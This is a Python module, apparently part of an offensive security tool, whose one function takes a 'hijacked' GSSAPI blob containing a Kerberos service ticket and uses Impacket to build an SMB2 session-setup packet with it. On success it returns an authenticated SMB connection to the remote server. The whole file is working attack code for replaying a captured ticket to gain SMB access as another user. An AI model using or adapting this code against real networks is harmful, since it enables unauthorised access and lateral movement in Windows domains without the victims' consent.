from impacket.smb3structs import SMB2_DIALECT_21, SMB2_SESSION_SETUP, SMB2SessionSetup
from impacket.smbconnection import SMBConnection
from impacket.nt_errors import STATUS_SUCCESS
from impacket.smb3 import SessionError
from colorama import Fore


# A method to get an Impcaket SMBConnection object from
# our hijacked gssapi blob containing a service ticket
def getAuthenticatedImpacketSMBConnection(remote_name, remote_destination, gssapi_blob):
    connection = SMBConnection(
        remoteName=remote_name, remoteHost=str(remote_destination), preferredDialect=SMB2_DIALECT_21
    )
    _server = connection.getSMBServer()  # <class 'impacket.smb3.SMB3'>
    sessionSetup = SMB2SessionSetup()
    sessionSetup['Flags'] = 0
    gssapi_blob_length = len(gssapi_blob)
    sessionSetup['SecurityBufferLength'] = gssapi_blob_length
    sessionSetup['Buffer'] = gssapi_blob
    packet = _server.SMB_PACKET()
    packet['Command'] = SMB2_SESSION_SETUP
    packet['Data'] = sessionSetup
    _server._Session['PreauthIntegrityHashValue'] = _server._Connection['PreauthIntegrityHashValue']
    try:
        packetID = _server.sendSMB(packet)
        ans = _server.recvSMB(packetID)
        if ans.isValidAnswer(STATUS_SUCCESS):
            print("\tKerberos auth succeeded :-)")
            _server._Session['SessionID'] = ans['SessionID']
            _server._Session['SigningRequired'] = _server._Connection['RequireSigning']
            _server._Session['Connection'] = _server._NetBIOSSession.get_socket()
            return connection
        else:
            return None
    except SessionError as e:
        print(
            f"{Fore.LIGHTRED_EX}\tSomething went wrong when hijacking the SMB connection :'("
            f"\t{e}{Fore.LIGHTYELLOW_EX}"
        )
        return None
